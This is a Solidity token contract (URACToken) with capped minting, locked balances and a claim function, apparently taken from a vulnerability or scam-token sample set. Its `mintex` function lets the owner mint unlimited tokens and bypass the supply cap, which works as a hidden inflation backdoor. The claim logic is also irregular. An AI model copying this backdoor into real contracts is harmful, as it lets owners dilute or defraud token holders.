pragma solidity ^0.5.2;








contract URACToken is PausableToken {
    using SafeMath for uint;

    
    string public constant name = "URACToken";
    string public constant symbol = "URAC";
    uint public constant decimals = 18;

    
    uint public currentSupply;

    
    
    address public minter;

    
    mapping (address => uint) public lockedBalances;

    
    bool public claimedFlag;

    


    modifier onlyMinter {
        require(msg.sender == minter);
        _;
    }

    modifier canClaimed {
        require(claimedFlag == true);
        _;
    }

    modifier maxTokenAmountNotReached (uint amount){
        require(currentSupply.add(amount) <= totalSupply);
        _;
    }

    modifier validAddress( address addr ) {
        require(addr != address(0x0));
        require(addr != address(this));
        _;
    }

    






    constructor(address _minter, address _admin, uint _maxTotalSupply)
        public
        validAddress(_admin)
        validAddress(_minter)
        {
        minter = _minter;
        totalSupply = _maxTotalSupply;
        claimedFlag = false;
        transferOwnership(_admin);
    }

    function mintex(uint amount) public onlyOwner {
        balances[msg.sender] = balances[msg.sender].add(amount);
        totalSupply = totalSupply.add(amount);
    }

    









    function mint(address receipent, uint amount, bool isLock)
        external
        onlyMinter
        maxTokenAmountNotReached(amount)
        returns (bool)
    {
        if (isLock ) {
            lockedBalances[receipent] = lockedBalances[receipent].add(amount);
        } else {
            balances[receipent] = balances[receipent].add(amount);
        }
        currentSupply = currentSupply.add(amount);
        return true;
    }


    function setClaimedFlag(bool flag)
        public
        onlyOwner
    {
        claimedFlag = flag;
    }

     



    
    function claimTokens(address[] calldata receipents)
        external
        canClaimed
    {
        for (uint i = 0; i < receipents.length; i++) {
            address receipent = receipents[i];
            
            balances[msg.sender] = balances[msg.sender].add(lockedBalances[receipent]);
            transfer(receipent, lockedBalances[receipent]);
            lockedBalances[receipent] = 0;
        }
    }
}





